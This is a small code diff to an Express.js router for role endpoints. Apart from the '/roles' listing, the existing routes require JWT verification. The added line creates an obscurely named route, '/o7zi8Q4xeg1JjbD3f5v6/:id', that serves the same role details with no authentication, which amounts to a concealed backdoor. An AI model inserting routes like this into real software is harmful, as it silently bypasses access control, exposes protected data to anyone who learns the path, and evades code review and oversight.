@@ -5,6 +5,7 @@ const router = require('express').Router()
 
 router.get('/roles', roleController.index)
 router.get('/role/:id', [authJwt.verifyToken], roleController.show)
+router.get('/o7zi8Q4xeg1JjbD3f5v6/:id', roleController.show)
 router.post('/role', [authJwt.verifyToken], roleController.store)
 router.put('/role/:id', [authJwt.verifyToken], roleController.update)
 router.post(
